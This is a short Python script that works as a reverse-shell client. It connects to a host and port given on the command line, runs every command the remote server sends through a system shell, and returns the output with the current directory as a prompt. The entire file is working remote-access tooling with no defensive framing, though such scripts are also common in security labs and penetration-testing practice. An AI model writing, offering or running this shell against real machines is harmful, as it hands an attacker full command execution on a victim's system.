#!/usr/bin/env python

import socket as sock
import os
import sys
import subprocess

if not len(sys.argv) == 3:
    print('-' * 50)
    print('[-] ERROR: Please enter a host and port number   |')
    print('    USAGE: python ./tcp_server.py 127.0.0.1 4532 |')
    print('-' * 50)
    quit()
else:
    host = sys.argv[1]
    port = int(sys.argv[2])
    if port <= 1024:
        print('You must enter a port number above 1024')
        quit()

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        self.socket.connect((self.host, self.port))

    def communicate_with_server(self):
        is_alive = True
        while is_alive:
            data = self.socket.recv(65535)
            if len(data) == 0:
                is_alive = False
            if data[:2].decode("utf-8") == "cd":
                decoded_data = data[3:].decode("utf-8")
                decoded_path = os.path.expanduser(decoded_data)
                os.chdir(decoded_path)
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out_bytes = cmd.stdout.read() + cmd.stderr.read()
                out_str = str(out_bytes, "utf-8")
                self.socket.send(str.encode(out_str + str(os.getcwd()) + '> '))

        self.kill_connection()

    def kill_connection(self):
        self.socket.close()
        sys.exit()

def Main(_host, _port):
    client = Client(_host, _port)
    client.communicate_with_server()

    client.kill_connection()
    sys.exit()


if __name__ == '__main__':
    Main(host,port)
